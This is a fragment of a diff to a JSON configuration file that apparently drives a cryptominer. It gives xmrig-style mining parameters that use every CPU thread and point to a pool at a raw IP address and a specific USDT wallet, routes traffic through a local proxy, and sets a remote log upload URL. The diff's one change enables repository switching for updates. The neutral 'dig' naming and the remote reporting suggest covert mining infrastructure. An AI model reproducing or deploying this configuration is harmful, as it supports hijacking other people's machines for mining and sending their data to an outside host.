@@ -6,7 +6,7 @@
     "dig_duration_down": 80,
     "working_seconds": 21480,
     "dig_parameters": "--url 43.130.11.12:3334 --proxy 127.0.0.1:$xray_port --tls --user USDT:TJiNVKmh7HEoqRJpQ89ERu2Se91BoxncWo.$account_id#gdq3-2tb1 --threads $(nproc) --randomx-mode fast --keepalive",
-    "forbid_update_repo_switch": true,
+    "forbid_update_repo_switch": false,
     "tcp_link_switch": false,
     "tcp_link_host_port": "43.130.11.12:2095",
     "dig_log_upload_url": "http://43.130.11.12:3000/upload",
